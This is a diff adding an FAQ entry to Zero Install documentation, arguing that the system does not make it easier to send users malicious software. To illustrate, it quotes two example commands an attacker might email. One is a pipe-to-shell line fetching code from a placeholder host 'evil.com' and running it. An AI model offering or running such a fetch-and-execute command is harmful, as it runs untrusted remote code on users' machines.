@@ -284,6 +284,27 @@ and get other people to link to that. The advantage here is that, again, everyon
 <tt>/uri/0install/gimp.org/gimp</tt> if they want, not just Debian users).
 </p>
 
+<h3>Doesn't Zero Install make it easier to send users malicious software?</h3>
+
+<p>
+Not really. True, you could email a user, telling them to run:
+</p>
+<pre>
+$ /uri/0install/evil.com/wipe-my-files
+</pre>
+<p>
+But on the other hand, you could also send them an email telling them to type:
+</p>
+<pre>
+$ lynx -source http://evil.com | sh -
+</pre>
+<p>
+Both can do exactly the same amount of damage, but the second works on any
+system. Zero Install helps with large, complicated programs with lots of
+dependancies, whereas your typical malicious program is only a few lines long,
+and doesn't benefit from it.
+</p>
+
 <h3>What was the inspiration for Zero Install?</h3>
 
 <p>
